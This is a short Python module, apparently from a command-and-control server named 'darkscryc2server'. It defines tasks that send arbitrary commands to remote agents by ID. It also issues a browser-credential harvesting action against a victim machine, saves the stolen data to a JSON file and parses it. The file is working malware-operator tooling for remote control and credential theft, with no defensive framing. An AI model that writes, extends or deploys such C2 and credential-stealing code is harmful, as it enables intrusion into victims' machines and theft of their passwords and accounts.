from darkscryc2server.Utils.remote_utils.commands import remote_send_command
from darkscryc2server.Models.schemas import GenAction, CommandIdentifiers
from darkscryc2server.Models.ModulesSchemas.Collection import CredentialType
from darkscryc2server.Utils.ModulesUtils.webgather import gather_browser_credentials

async def remote_send_command_task(ctx, agent_id: str, command: str, _action_name:str):
    result = await remote_send_command(conn_id=agent_id, command=command)
    if not result.success:
        raise Exception(result.error)
    return result.model_dump()


async def remote_send_web_cred_gather(ctx, agent_id: str, cred_type: CredentialType):
    command = GenAction(action=CommandIdentifiers.FETCH_WEB_BROSER_CREDENTIALS, cred_type=cred_type.value).xml()
    result = await remote_send_command(conn_id=agent_id, command=command)
    if not result.success:
        raise Exception(result.error)
    open("/root/darkscryc2/test.json", "w").write(str(result.data))
    creds = await gather_browser_credentials(result.data)
    return creds.model_dump()